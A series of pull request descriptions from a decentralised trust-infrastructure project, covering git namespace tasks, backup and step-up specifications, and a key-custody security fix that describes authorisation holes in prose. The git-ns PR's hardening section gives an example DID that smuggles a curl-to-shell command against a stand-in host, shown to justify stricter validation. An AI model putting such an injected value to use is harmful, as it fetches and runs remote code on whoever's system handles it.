title: Record three divergences from the community node's git namespaces
body:
Three observed entries in a new Appendix F.5, for behaviour the community
node's `git-ns/*` task family introduced
(OpenVTC/verifiable-trust-infrastructure#1694, #1703, #1714). The rows
describe behaviour without naming the implementation, as F.7 asks; the
citations are here.

- VTI-ACL-001, VTI-VTC-020. The family is authorized by per-resource git
  rights held in their own store (vtc-service/src/git_ns/{rules,store}.rs),
  not by access control entries; the entry is read only for membership and
  for community-administrator standing (ops.rs `standing`). A bridge with no
  entry holds a commit right. Grants are bounded by the granter's authority,
  but by default outlive the granter's departure (`cascade_on_departure`
  false), which is the half of VTI-ACL-071 the model does not meet.
- VTI-VTC-021, VTI-APV-003, VTI-APV-015. No step-up on the signed-document
  path. The interim `[git_ns] elevated_requires_admin` (default true,
  git_ns/mod.rs, ops.rs `consent_gate`) admits elevated and destructive
  actions only from a community administrator. It narrows, but it is not
  re-authentication, and it runs inside each operation rather than at the
  policy gate. The resolution points at VTI-APV-015, whose signed-document
  form #40 added and OpenVTC/verifiable-trust-infrastructure#1713 designs.
- VTI-REG-001. Every live right, not only the commit right verifiers query,
  is published to the Trust Registry against the holder's DID
  (git_ns/projection.rs `desired`). The git-ns specification requires this
  (right/grant/0.1, namespace/bind/0.1).

Adding a section renumbers Closed to F.6 and How to add an entry to F.7, and
the one in-text reference to Closed follows. No requirement text changes.

`npm run render` completes, and docs/index.html carries the new section with
three rows of four cells.

Where the entries go further than the implementer's draft, each point was
checked in the merged tree:

- The first entry also records the bridge's entry-less commit right and the
  departed-granter default, and notes that the proposed note cannot be
  carried by extension members (VTI-ACL-005), so it needs requirements of its
  own.
- The second cites VTI-APV-003 and VTI-APV-015 beside VTI-VTC-021 rather than
  the approvals chapter as a whole, and records that the class list is not an
  approval rule (VTI-APV-001) and is checked in the handler (VTI-OPS-051).
- The third proposes, besides the scoping of VTI-REG-001, a bound on
  publication for other purposes, since scoping alone would leave the
  registry records under no requirement; and records that the four rights
  verifiers never query are published too.

title: trust-tasks-rs-v0.22.7
body:
### Added

- **backup**: A node-neutral backup and restore family ([#633](https://github.com/trustoverip/dtgwg-trust-tasks-tf/pull/633))

`vta/backup/*` is the agent's descriptor-based backup and restore: a slot,
  digests pre-committed before any byte moves, the bundle carried either as an
  HTTPS stream or chunk by chunk over the agent's own Trust Task transport, and a
  finalize step that previews before it replaces. Nothing in that transfer is
  specific to an agent, and a community node needs exactly the same thing for the
  same reason: a backup of any real node is too large for one document, and a
  node that bounds a document's size before checking its proof — as it must on a
  binding that authenticates no sender — cannot accept one that way.
  `vtc/backup/import/0.1`, which carries the whole envelope inline, is the case
  in point.

  This adds `backup/{initiate-export, get-chunk, complete-export,
  initiate-import, put-chunk, finalize-import, abort}/0.1`, derived from the
  latest `vta/backup/*` versions and made node-neutral:

  - The parties, prose and error-code slugs name a node rather than an agent.
  - What a backup contains is the node's to define. `finalize-import`'s
    response replaces the agent-specific `keyCount` / `aclCount` /
    `contextCount` / `auditCount` / `importedSecretCount` with one `counts` map
    keyed by the node's own record kinds — an agent's `keys`, `acl`, `contexts`,
    `audit`, `importedSecrets`; a community's backed-up keyspaces — still
    counts, never contents.
  - The transfer shapes (descriptor, chunk manifest, chunk data, bundle id) are
    referenced from `vta/_shared/0.1/backup-transfer` rather than copied. A copy
    with the node-neutral wording would have been a second definition that the
    TypeScript generator disambiguates by renaming the published `ChunkData`,
    `ChunkSize`, `ChunkManifest`, `ChunkedDescriptor` and `BundleDescriptor`
    exports — a break for every TS consumer, for no difference on the wire.
  - The "Changes from 1.0" history sections are dropped; a new 0.1 has no
    predecessor, and the abstract says where the family came from.

  `vta/backup/*` stays served while agents adopt this family, and
  `vtc/backup/{export,import}` remain for a node small enough to fit one
  document. Retiring the agent-specific versions is a later change.

  Bindings regenerated for Rust, TypeScript, Go and Dart; the only change to
  existing generated code is the new `backup` feature and index entries.



### Specifications

- **auth/step-up**: A step-up bound to one operation needs no session ([#631](https://github.com/trustoverip/dtgwg-trust-tasks-tf/pull/631))

`approve-response/0.3` introduced the bound approval — one that authorizes a
  single operation and elevates nothing, answered `recorded` — but
  `approve-request` still required a `sessionId`, and `approve-response` echoed
  one. So the only operations a step-up could be bound to were ones that arrived
  over a session.

  An operation that arrives as a signed Trust Task document has none: its
  authority is its proof. Binding the human's gesture to one of their sessions
  after the fact cannot say which, and a window opened on any of them is one a
  process holding the signer's key can spend on acts the human never saw — the
  same defect as a session elevation standing in for consent.

  - `approve-request/0.3`: `sessionId` is omitted for a step-up bound to an
    operation that arrived without a session, and a relying party MUST NOT fill
    it with a session it chose after the fact. A new `boundTo` names the bound
    operation — for a signed document, a digest of its type and payload salted
    with the challenge, since an unsalted digest over a short, predictable
    payload is a confirmation oracle. A new "Inline delivery" section lets a
    relying party with no push channel carry the request in the refusal of the
    operation it is for (`details.stepUpRequest`); it is authenticated by being
    the relying party's own reply, so a producer must not surface one received
    any other way, and it is for bound step-ups only. The four Security &
    Privacy sub-headings are added.
  - `approve-response/0.4`: `sessionId` is echoed exactly when the request
    carried one, and a response carrying one for a session-less step-up is
    refused (`subjectMismatch`), so a bound approval cannot be read as naming a
    session to elevate. The subject is compared with the subject bound to the
    pending step-up rather than with a session's.

  Both are backward-compatible minors: a required member became optional and an
  optional one was added. Motivated by the community node's signed-document
  step-up (OpenVTC/verifiable-trust-infrastructure#1713) and by
  trustoverip/dtgwg-vti-spec#40, which amends VTI-APV-003 to admit it.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

title: security(vta)!: key custody — seed and key material only through audited, scope-checked doors (FTL-29904)
body:
Fixes FTL-29904 (a context-scoped admin could read and rotate the instance-wide seed) and five more holes of the same kind that turned up in the review.

## The mistake

Every key the VTA holds is a pure function of the master seed and a BIP-32 path, so **choosing a path is holding a key**. Each gate below asked about the caller's role or context and never about the path or key id the caller named.

| # | Surface | What a context-scoped caller could do | Severity |
|---|---|---|---|
| 1 | `keys/seeds` list/rotate on REST, Trust Task **and DIDComm** (the report named two transports) | Read the rotation history; rotate the whole instance's seed | High |
| 2 | `keys/create` with `derivationPath` | Derive any key (another tenant's, or the VTA's own `did:webvh` update key), record it under its own context, and export it with `keys/export-secret` | Critical |
| 3 | `keys/derive-and-sign(-document)` | Sign as any path, including the VTA's update key | Critical |
| 4 | `vault/sign-trust-task`, `vault/proxy-login` | Store an entry naming `{vta_did}#key-0`; the VTA then signs as itself. Role `initiator` suffices | Critical |
| 5 | `credentials/issue`, `/revoke` | Mint VTA-signed VCs over arbitrary claims | High |
| 6 | `vault/credentials/receive` (mdoc) | Bind an mdoc to a key with no context without super-admin | Low |

## The fix

- **`vta_keys::custody`** states seven rules, citing VTI-KEY-030/032, VTI-VTA-001, VTI-ACL-022/092 and VTI-CTX-002, and holds the pure checks. `RecordKey` keeps the BIP-32 root private and derives only at its record's own path.
- **`vta_service::operations::key_custody`** holds the only functions network-reachable code uses to reach key material: `derive_record_key`, `authorize_explicit_key_path`, `derive_delegated_identity`, `require_referenced_key_in_scope` and `require_instance_authority`.
  - Every refusal is audited (`key.custody_violation` / `authority.instance_required`, outcome `denied`; VTI-AUD-003) and logged with `security_alert = true`.
- **Gates live in the operation**, not the transport. The seed gate existed three times (`AdminAuth`, `require_admin`, `Gate::Admin`), none of them checked scope, and none audited a refusal.
- **Checked at use.** A record whose path lies outside its context's base is refused when it would sign or be exported, so a record planted before this fix, or carried in by a restore, is inert.
- **Boot-time scan.** At startup the VTA reports any such record through audit and `security_alert`. It never revokes. This is how to see whether a dev VTA was exploited.
- **Delegated signing** (`derive-and-sign*`) is super-admin only, confined to `m/26'/9'`, and audited with a SHA-256 of what was signed (VTI-VTA-006).
- **`tests/key_custody_census.rs`** pins every production raw seed access with its reason; a new one fails until someone reviews it.
- **Docs:** `docs/05-design-notes/key-custody.md`, a CLAUDE.md runtime-guard entry, and updated SDK and DIDComm docs.

## Behaviour changes

- Context-scoped admins lose seed list/rotate, caller-chosen derivation paths, `derive-and-sign*`, and VC issue/revoke.
- `derive-and-sign*` refuses any path outside `m/26'/9'` for every caller. The fleet manager only uses `m/26'/9'/<idx>'`.
- A vault entry whose `signingKeyId` is outside its context is refused at upsert and at use.
- `vta-service` library signatures change (claims, contexts keyspace and audit sink are now threaded through), hence the `!`.

Two existing tests relied on the holes and were changed:
- The vault signing test signed as the VTA's own `#key-0`. It now mints a key in the entry's context.
- A coverage test called `derive-and-sign` at `m/26'/2'/0'/7'`. It now uses `m/26'/9'/7'`.

## Verification (local, what CI runs)

- `cargo test --workspace --exclude vtc-service --exclude vtc-client --no-fail-fast`: 4,878 passed, 0 failed. This was run before the rebase; after rebasing onto `main`, clippy and both census tests were rerun and pass.
- `cargo test -p vtc-service -p vtc-client`: 2,001 passed.
- `cargo clippy --workspace --all-targets -- -D warnings`: clean.
- The three reduced-feature `vta-service` clippy runs: clean.
- `cargo fmt --all -- --check`: clean.

## Found in the review, not in this PR

Scope bugs that don't involve key material get a separate PR: session revocation across DIDs and consent grants (in progress), plus audit verify, policy reads, and ACL/device operations where the caller shares only one of the target's contexts. `step-up/approve-request` signs with `#key-0` for any authcrypt sender behind an approval check that always returns `true`. The missing ACL lookup is deliberate and documented in the code, so it needs a design decision, not a patch.

title: security(vta)!: key custody — seed and key material only through audited, scope-checked doors (FTL-29904) (#1715)
body:
security(vta)!: key custody — seed and key material only through audited, scope-checked doors (FTL-29904) (#1715)

Every key the VTA holds is a pure function of the master seed and a BIP-32
path, so choosing a path is holding a key. FTL-29904 reported that a
context-scoped admin could list and rotate the instance-wide seed; the review
found the same mistake, a gate asking about the caller's role or context and
never about the path or key it named, in five more places:

- seeds list/rotate: gated on the admin role on REST, Trust Task AND DIDComm
  (the report named two transports). Now super-admin, enforced once in the
  operation so all three share one audited refusal (VTI-ACL-022, VTI-ACL-092).
- keys/create accepted any derivationPath and recorded the key under the
  caller's own context, so keys/export-secret released it: another tenant's
  key or the VTA's own did:webvh update key. Only a super-admin may choose a
  path, and the path must belong to the record's context (VTI-KEY-030/032).
- keys/derive-and-sign(-document) signed as any path for any admin. Now
  super-admin only and confined to the delegated-identity subtree m/26'/9';
  every signature is audited with a digest of what was signed (VTI-VTA-006).
- vault/sign-trust-task and vault/proxy-login loaded the entry's signingKeyId
  under InternalAuthority with no scope check, so an entry naming
  {vta_did}#key-0 made the VTA sign as itself (reachable by `initiator`). The
  key must now be in the entry's context subtree, at use and at upsert.
- credentials/issue and credentials/revoke (VTA-signed VCs over caller-chosen
  claims) required only the admin role. Now super-admin.
- vault/credentials/receive could bind an mdoc to a context-less key without
  super-admin.

Structure:

- vta_keys::custody states the rules and holds the pure checks. RecordKey
  keeps the BIP-32 root private and derives only at its record's own path.
- vta_service::operations::key_custody is the only door network-reachable
  code uses: derive_record_key, authorize_explicit_key_path,
  derive_delegated_identity, require_referenced_key_in_scope,
  require_instance_authority. Every refusal is audited
  (key.custody_violation / authority.instance_required, outcome denied,
  VTI-AUD-003) and logged with security_alert = true.
- Rule 6: a record whose path lies outside its context's base is refused at
  use (export, sign, holder keys, did:webvh), so a record planted before this
  fix, or carried in by a restore, is inert. A boot-time scan reports any
  such record (it never revokes).
- tests/key_custody_census.rs pins every production raw seed access
  (load_seed_bytes / ExtendedSigningKey::from_seed / seed_store.get()) with
  its reason; a new one fails until reviewed.

Breaking for vta-service library callers: the seed, derive-and-sign,
get_key_secret(_internal), holder-key, credential-exchange and vault signing
operations take new parameters (claims, contexts keyspace, audit sink).
Behaviour: context-scoped admins lose seed operations, caller-chosen
derivation paths, derive-and-sign and VC issuance; derive-and-sign refuses any
path outside m/26'/9' for everyone; vault entries whose signingKeyId is outside
their context are refused.

Design note: docs/05-design-notes/key-custody.md.

title: fix(vtc-service): git-ns review follow-ups — adopt policy input, legacy revoke, reseat evidence
body:
Follow-ups from the review of #1703.

- **Adoption is visible to policy.** An adopted drift item is evaluated as `right.grant` with `via: "drift.adopt"` in the policy input (`git-ns/drift/resolve`, step 6).
  - A community can therefore refuse every adoption while still allowing grants.
  - The default policy's input comment and `docs/03-vtc/git-namespaces.md` describe it.
- **Legacy subjects can still be revoked.** `right/revoke` accepts a subject that is not a DID-core DID when a recorded right names it (one granted before #1703 enforced DID-core), so no right is left that nobody can take away. Grant, transfer, adopt and reseat still refuse such a DID.
- **Reseat evidence** (`git-ns/namespace/reseat`, step 7) comes from the audit log. For each earlier `git.ns.admin` record it reports how the record ended:
  - revoked, with by whom and why (a revoke's audit row now keeps its reason);
  - lapsed, with when;
  - removed on its holder's departure, with when;
  - records not yet swept are reported from the rights set.

  Holders are not named. The subject's own lapsed admin record is replaced rather than kept beside the new one, as a grant does.
- **Adopt re-checks its item under the store lock the grant is written under**, including the `observed` value. An item that changed since it was selected adopts nothing.
- Two string literals that had lost their line continuation are fixed: the `notHeadless` message and cnm's `--observed` error.
- **cnm hints:**
  - The VTC's error code is sanitised for the terminal, as its message already was.
  - The `notAdoptable` hint for a forge-side lowering names `git revoke`.
  - The `notRevertible` hint covers manual mode and accounts the projection holds.

## Tests

- `adopting_an_admin_role_is_elevated_and_needs_a_community_administrator`: under the default consent gate an owner is refused and a community administrator is not.
- `reverting_a_role_the_projection_holds_is_not_revertible`
- `a_policy_can_refuse_adoptions_and_still_allow_grants`
- `an_adoption_whose_item_changed_grants_nothing`
- `a_legacy_subject_can_still_be_revoked`
- `reseat_evidence_reports_revocations_and_replaces_a_lapsed_record`
- cnm: `drift_refusals_name_the_remedy_that_applies`, plus a control-character code in `printed_commands_quote_what_a_shell_would_interpret`.

Locally: `cargo test -p vtc-service --lib git_ns` (120 passed), `cargo test -p cnm-cli`, `cargo test -p vta-sdk --lib identifier`, and clippy with `-D warnings` on vtc-service, cnm-cli and vta-sdk.

Note: #1703 was squash-merged as `feat`, so the `vta-sdk` change it carried (`validate_did_core`) takes a minor bump. No `feat(vta-sdk,…)` title is needed here.

title: chore: release 11 packages
body:
The Release PR for every package in this repo. **Merging this is the release.**

| Package | Registry | Version | Bump |
|---|---|---|---|
| `trust-tasks` | crates.io | `0.22.6` → `0.22.7` | patch |
| `trust-tasks-capability-client` | crates.io | `0.22.6` → `0.22.7` | patch |
| `trust-tasks-didcomm` | crates.io | `0.22.6` → `0.22.7` | patch |
| `trust-tasks-didcomm-v1` | crates.io | `0.22.6` → `0.22.7` | patch |
| `trust-tasks-https` | crates.io | `0.22.6` → `0.22.7` | patch |
| `trust-tasks-proof` | crates.io | `0.22.6` → `0.22.7` | patch |
| `trust-tasks-rs` | crates.io | `0.22.6` → `0.22.7` | patch |
| `trust-tasks-tsp` | crates.io | `0.22.6` → `0.22.7` | patch |
| `@openvtc/trust-tasks` | npm | `0.20.7` → `0.20.8` | patch |
| `github.com/trustoverip/dtgwg-trust-tasks-tf/trust-tasks-go` | Go (tag `trust-tasks-go/v0.2.8`) | `0.2.7` → `0.2.8` | patch |
| `trust_tasks` | pub.dev | `0.2.7` → `0.2.8` | patch |

What merging does, per registry (all in `publish.yml`, each keyed on "this
version is not published yet"):

- **crates.io** — `release-plz-release` tags `<crate>-v<version>`, publishes in
  dependency order and creates a GitHub Release per crate. Bump levels come from
  `cargo-semver-checks`.
- **npm** — `publish-npm` publishes with OIDC provenance and tags
  `<prefix>-v<version>`.
- **Go** — `publish-go` builds, vets and tests, then pushes the tag, which *is*
  the publication. **Irreversible**: proxy.golang.org never forgets a tag.
- **pub.dev** — `tag-dart` verifies against the *published* core and pushes the
  tag; `publish-dart.yml` publishes from it.

The npm, Go and Dart bumps are only as accurate as the commit subjects — nothing
checks their APIs the way `cargo-semver-checks` checks the crates. Look for a
missing `!` before merging.

This branch is regenerated from `main` on every push, so do not commit to it —
edits are force-pushed away. See RELEASING.md.

title: feat(backup): a node-neutral backup and restore family (#633)
body:
feat(backup): a node-neutral backup and restore family (#633)

`vta/backup/*` is the agent's descriptor-based backup and restore: a slot,
digests pre-committed before any byte moves, the bundle carried either as an
HTTPS stream or chunk by chunk over the agent's own Trust Task transport, and a
finalize step that previews before it replaces. Nothing in that transfer is
specific to an agent, and a community node needs exactly the same thing for the
same reason: a backup of any real node is too large for one document, and a
node that bounds a document's size before checking its proof — as it must on a
binding that authenticates no sender — cannot accept one that way.
`vtc/backup/import/0.1`, which carries the whole envelope inline, is the case
in point.

This adds `backup/{initiate-export, get-chunk, complete-export,
initiate-import, put-chunk, finalize-import, abort}/0.1`, derived from the
latest `vta/backup/*` versions and made node-neutral:

- The parties, prose and error-code slugs name a node rather than an agent.
- What a backup contains is the node's to define. `finalize-import`'s
  response replaces the agent-specific `keyCount` / `aclCount` /
  `contextCount` / `auditCount` / `importedSecretCount` with one `counts` map
  keyed by the node's own record kinds — an agent's `keys`, `acl`, `contexts`,
  `audit`, `importedSecrets`; a community's backed-up keyspaces — still
  counts, never contents.
- The transfer shapes (descriptor, chunk manifest, chunk data, bundle id) are
  referenced from `vta/_shared/0.1/backup-transfer` rather than copied. A copy
  with the node-neutral wording would have been a second definition that the
  TypeScript generator disambiguates by renaming the published `ChunkData`,
  `ChunkSize`, `ChunkManifest`, `ChunkedDescriptor` and `BundleDescriptor`
  exports — a break for every TS consumer, for no difference on the wire.
- The "Changes from 1.0" history sections are dropped; a new 0.1 has no
  predecessor, and the abstract says where the family came from.

`vta/backup/*` stays served while agents adopt this family, and
`vtc/backup/{export,import}` remain for a node small enough to fit one
document. Retiring the agent-specific versions is a later change.

Bindings regenerated for Rust, TypeScript, Go and Dart; the only change to
existing generated code is the new `backup` feature and index entries.

title: docs(spec): release framework version 0.7.0
body:
Releases framework version 0.7.0. This was originally prepared as a 0.6.1 patch for the NAOMS review of WD 0.6.0. Since then, main has taken three MINOR changes under §5.1.1: #20 (a private Type URI may be any absolute URI), #22 (a baseline cryptosuite) and #23 (`extCritical`). A patch number no longer fits, so this PR releases all of them together with the review fixes.

## Changes

- **Appendix B: "Unreleased" becomes "Framework version 0.7.0".** The intro now names the new optional member (`extCritical`) and the new error code (`unsupportedExtension`), plus the two changes that can require work from an existing consumer. New bullets cover:
  - `extCritical`, since #23 didn't add a changelog entry
  - the review fixes below
  - the registry companions that are still open
- **Examples sign with `eddsa-jcs-2022`, the new baseline.** Example 1, the error-response example and the Appendix A example carried `eddsa-rdfc-2022`, which a consumer is no longer guaranteed to verify. (NAOMS Q3)
- **The Abstract states the bilateral model.** It said "between two or more parties" while §3 defines every document as bilateral. (NAOMS drafting note)
- **Group as a party (non-normative note in §4.8).** A group holding authority jointly, e.g. under a threshold key, is a party when it has its own VID. Which members may act for it is authorization (Consumer Requirements item 10), not the envelope's job. (NAOMS Proposal 1)
- `Document Status` → Working Draft 0.7.0.
- **Editorial pass (second commit).** A review of the whole text:
  - aligns prose that still assumed every Type URI is dereferenced
  - corrects stale discovery and "this version" statements
  - fixes wrong cross-references and a restated slug-reservation rule that had drifted from Type URI
  - completes member lists with `parentThreadId`, `ceremony` and `extCritical`
  - adds RFC 6901 to the References
  - reorders Example 4 ahead of 4a
  - normalises to US spelling. The `Behaviour at Each Status` heading is kept because the registry aliases its anchor.
- **Review decisions (third commit).**
  - An unpublished reserved type gets `unsupportedType`.
  - Slugs are scoped to their authority, and discovery picks results by the whole Type URI, not the slug.
  - New Security Considerations subsections on cryptosuite downgrade and stripping an `extCritical` marking.
  - Producer Requirements restate the `extCritical` rules.
  - A specification may now mention ceremonies in prose.
  - The lifecycle allows `validated` → `expired`.
  - Appendix A is brought up to 0.7.0 with the declarations current Specification Requirements expect.
- **Private transport bindings (fourth commit)** are named on the same terms as a private Type URI: a path or URN form, never under trusttasks.org, no `http`, and a publisher-controlled namespace as a **SHOULD**.

## Registry companions (dtgwg-trust-tasks-tf), after merge

- Publish the `trust-task/0.7.0` framework URI and a 0.7 envelope schema with the `ExtCritical` `$def` that §Marking a Namespace Critical refers to.
- Publish `trust-task-error/0.6`: 0.5's closed list of standard codes has no `unsupportedExtension`.
- Bring `acl/change-role/0.1` into line with Appendix A: `eddsa-jcs-2022` example, target 0.7.0, `identifierScope`, `exposure.ingests`, `retention`, and prose for authorization evidence and `reason`.

body:
docs(spec): release framework version 0.7.0 (#21)

* docs(spec): release framework version 0.7.0

Main now carries three MINOR changes since 0.6.0: a private Type URI
may be any absolute URI (#20), a baseline cryptosuite every consumer
verifies (#22), and extCritical with the unsupportedExtension error
code (#23). This release closes them out together with the NAOMS
review fixes that were prepared as 0.6.1.

- Appendix B: the Unreleased entry becomes Framework version 0.7.0.
  The intro names the new optional member and error code, and the
  entry gains bullets for extCritical (#23 carried none), the review
  fixes below, and the registry companions still open.
- Examples sign with eddsa-jcs-2022, the new baseline: Example 1, the
  error-response example and the Appendix A example all carried
  eddsa-rdfc-2022, which a consumer is not required to verify.
- The Abstract states the bilateral document model that Terminology
  defines, instead of implying an n-ary one.
- New non-normative note: a group holding authority jointly (e.g. a
  threshold key) is a party when it has its own VID; membership is an
  authorization question under Consumer Requirements item 10.
- Document Status to Working Draft 0.7.0.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* docs(spec): editorial pass for 0.7.0

Fixes from a review of the whole framework text ahead of the 0.7.0
release. No normative change beyond aligning stale text with #20, #22
and #23.

- Content negotiation: the payload-schema  rule, JSON-LD context
  (JSON-LD Compatibility, Spec Requirements item 10) and Consumer
  Requirements item 2 no longer assume every Type URI is dereferenced.
- The /binding/ disjointness rule covers the URN form and names the
  trusttasks.org authority.
- The restated slug reservation (Private specs item 2) matches Type URI:
  ^trust-(task|ceremony)($|-|/). The ceremony and binding sections cite
  the authority rule (item 1), not the reservation rule.
- Marking a Namespace Critical names the ext rules 2 and 5 it means.
- Member lists add parentThreadId, ceremony and extCritical.
- Discovery: the proof requirement is RECOMMENDED in both published
  versions; requiredExt no longer pinned to 0.1.
- "This version" phrases dated to 0.4.0/0.5.0 are made explicit.
- Wrong cross-references fixed (third -> second paragraph, See below ->
  above, trust-task-error registry entry).
- RFC 6901 added to References.
- Example 4 moved ahead of Example 4a into the threadId section;
  Example 5 gets its own thread id.
- US spelling throughout (the Behaviour at Each Status heading is kept,
  since the registry aliases its anchor), grammar, italicised terms,
  bold BCP 14 keywords.
- Appendix B 0.7.0 entry: extCritical is a payload member, recognising
  unsupportedExtension is consumer work, trust-task-error/0.6 is a
  registry companion, and an editorial-fixes bullet.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* docs(spec): resolve 0.7.0 review decisions

- Reserved Response-Type Slugs: a document of an unpublished reserved
  type is answered with unsupportedType, not unsupportedVersion.
- Slugs are scoped to their authority. Type URI and Private specs
  item 1 say a private Type URI can never equal a registry one; Pattern
  Grammar says a discoverer chooses by the whole Type URI, not the slug.
- Security Considerations: new Cryptosuite Downgrade and Stripping a
  Criticality Marking subsections.
- Producer Requirements restate the extCritical producer rules.
- The ceremony member: a specification MAY mention ceremonies in prose;
  it still MUST NOT make conformance depend on being a step or
  constrain the member.
- Document Lifecycle: validated -> expired is permitted, and validation
  includes Consumer Requirements item 13.
- Appendix A targets 0.7.0 and adds identifierScope, exposure.ingests,
  retention, authorization evidence and the free-text reason
  declaration; the walkthrough adds items 10 and 11. The registry entry
  is listed as a companion change.
- Appendix B entries for each.

* docs(spec): name a private transport binding like a private Type URI

A private binding URI had to use "an authority the publisher controls",
with no shape stated, while #20 let a private Type URI be any absolute
URI. Binding Namespace now gives a private binding the same terms: a
path form ending /binding/<slug>/<MAJOR.MINOR> or a URN form ending
:binding:<slug-segments>:<MAJOR.MINOR>, never under trusttasks.org, no
http, a publisher-controlled namespace as a SHOULD, and a name that is
dereferenced only when https. A publisher can then name a private
specification and its binding under one authority, such as a DID.

title: Allow re-authentication to be bound to one operation instead of a session
body:
VTI-APV-003 defined re-authentication only as raising the caller's session
assurance for a bounded window. That leaves nothing for a request that arrives
as a signed document rather than over a session: there is no session to raise,
and binding the gesture to one of the caller's sessions after the fact cannot
say which one — while a window opened on any of them is one a process holding
the caller's signing key can spend on acts the caller never saw. It is the
same defect VTI-APV-005 names for consent, reached from the other side.

APV-003 now admits either form, and the new VTI-APV-015 states the rules for
the operation-bound one: bound to the digest of the exact type and payload,
computed as APV-004 computes a consent digest; redeemable only by the caller
who performed it, only for that digest, only once; expiring; raising no
session's assurance; and made with the caller's own additional factor against
a challenge issued for that operation — so a signature by a key the caller
already holds does not satisfy it. The table's "Bound to" row names both.

It is strictly narrower than the session form, and it still establishes only
the caller's presence, never another party's agreement, which stays with
consent.

Prompted by OpenVTC/verifiable-trust-infrastructure#1713, which designs the
community node's signed-document step-up this way; the VTA already binds a
step-up approval to a single persona disclosure the same way.

title: spec(auth/step-up): a step-up bound to one operation needs no session
body:
`approve-response/0.3` introduced the bound approval — one that authorizes a
single operation and elevates nothing, answered `recorded` — but
`approve-request` still required a `sessionId`, and `approve-response` echoed
one. So the only operations a step-up could be bound to were ones that arrived
over a session.

An operation that arrives as a signed Trust Task document has none: its
authority is its proof. Binding the human's gesture to one of their sessions
after the fact cannot say which, and a window opened on any of them is one a
process holding the signer's key can spend on acts the human never saw — the
same defect as a session elevation standing in for consent.

- `approve-request/0.3`: `sessionId` is omitted for a step-up bound to an
  operation that arrived without a session, and a relying party MUST NOT fill
  it with a session it chose after the fact. A new `boundTo` names the bound
  operation — for a signed document, a digest of its type and payload salted
  with the challenge, since an unsalted digest over a short, predictable
  payload is a confirmation oracle. A new "Inline delivery" section lets a
  relying party with no push channel carry the request in the refusal of the
  operation it is for (`details.stepUpRequest`); it is authenticated by being
  the relying party's own reply, so a producer must not surface one received
  any other way, and it is for bound step-ups only. The four Security &
  Privacy sub-headings are added.
- `approve-response/0.4`: `sessionId` is echoed exactly when the request
  carried one, and a response carrying one for a session-less step-up is
  refused (`subjectMismatch`), so a bound approval cannot be read as naming a
  session to elevate. The subject is compared with the subject bound to the
  pending step-up rather than with a session's.

Both are backward-compatible minors: a required member became optional and an
optional one was added. Motivated by the community node's signed-document
step-up (OpenVTC/verifiable-trust-infrastructure#1713) and by
trustoverip/dtgwg-vti-spec#40, which amends VTI-APV-003 to admit it.

Bindings regenerated for Rust, TypeScript, Go and Dart.

## Verified locally

- `npm run validate`: 514 specs, 80 shared schemas
- `npm run check-bindings`: 514 specs agree across TypeScript, Rust, Go and Dart; declared error codes match Rust `ERROR_CODES`
- `cargo test -p trust-tasks-rs --all-features`: 1169 passed, 0 failed (incl. the generated conformance and `rejects_invalid_examples` tests for the new versions)

title: feat(vtc-service): git-ns drift/resolve, namespace/reseat, view 0.2
body:
Follow-ups to #1694, now based on `main`. Implements the git-ns tasks added in trust-tasks #625 and #627, on trust-tasks-rs 0.22.5.

## What

- **`git-ns/drift/resolve` 0.1.** An owner (or a namespace admin over the repository) answers one reported drift item.
  - **adopt** records the forge-side role as the `git-ns/right/grant` it is, under the same fixed rules, policy and consent class.
  - **revert** has the bridge undo the forge-side change and changes no right.
  - Items are selected by `type`, by `account` for role items, and by `observed`, which is required to adopt.
  - A resolution removes the item from `sync.drift` and queues an `inspect`.
  - Every declared code is implemented and tested: `driftNotFound`, `notAdoptable`, `accountNotLinked`, `noMatchingRight`, `notRevertible`, plus `unknownNamespace`, `namespaceNotBound`, `unknownRepo`, `repoNotActive`, `policyDenied`, `permissionDenied` and `malformedRequest`.
- **`git-ns/bridge/job` 0.2.** Sent only for reverting a `roleAdded` item (`projectRoles` with `removeAccounts`).
  - It is sent in-line, so a bridge that implements only 0.1 and refuses it is answered `notRevertible` rather than reported as done.
  - Every other job is still sent as 0.1.
- **`git-ns/namespace/reseat` 0.1.** A community administrator grants a permanent `git.ns.admin` to a current member on a headless namespace.
  - The headless check and the grant happen under one hold of the store lock.
  - `notHeadless` is refused without naming the live admins.
  - The audit record keeps the statement and how each earlier admin record ended, without a departed member's DID in plaintext.
- **`git-ns/view` 0.2**, served beside 0.1: `accounts` returns the caller's own linked forge accounts, narrowed to the forge of `resource` when one is given, and never another member's.
- **`git-ns/bridge/event` 0.2** (trust-tasks #627), served beside 0.1 by one handler, since the payloads are wire-identical.
  - A transfer detaches the repository wherever `to` is.
  - An event with any resource outside its namespace, drift items included, is refused before anything is applied. A transfer's `to` is exempt.
  - Repositories are matched by forge id against live rows only, and a detached repository holds no forge id (the rules #1694 landed with).
- **cnm:** `cnm git drift resolve …` and `cnm git reseat …`. `cnm git view` now asks for view 0.2. vtc-client gains the matching methods.
- **Default policy:** `namespace.reseat` counts as receiving a right, so the default admits only members; `drift.revert` is documented.

## Hardening beyond the specification

- **DIDs must be DID-core.** The `git-ns/_shared` `Did` pattern (`^did:[a-z0-9]+:\S+$`) admits shell metacharacters, e.g. `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)`.
  - The new `vta_sdk::identifier::validate_did_core` follows DID-core's ABNF: the method is `[a-z0-9]+`, and the method-specific id allows only `ALPHA / DIGIT / . - _ :` and percent-encoded octets. Path, query, fragment and whitespace are refused.
  - The VTC checks it first on every task that takes a DID: a grant or revoke subject, a transfer's `to`, an adoption's owners, a reseat's subject, and the account-linking member. Anything else is refused `malformedRequest`.
  - A spec tightening is being raised separately.
- **cnm is shell-safe.**
  - It applies the same DID check before signing.
  - Every value it prints inside a command is quoted as one POSIX shell word.
  - It strips control characters from the VTC's refusal text and from DIDs before printing them.

## Choices to review

- The projected right of a forge role is the inverse of VGI's default `RoleMap`:
  - `admin` maps to `own` and `maintain` to `maintain`.
  - On a personal account, `write` maps to `maintain`.
  - `write` on an organisation, `triage` and `read` project nothing. The VTC is not told whether committers are given `write`.
- Reverting an `admin` role has the impact of revoking `own` (elevated). Every other revert has the impact of revoking `maintain`. Under the default `elevated_requires_admin`, an owner therefore needs a community administrator to revert an `admin` role.

title: feat(tui): Repos panel for community git namespaces (member side of git-ns)
body:
## What

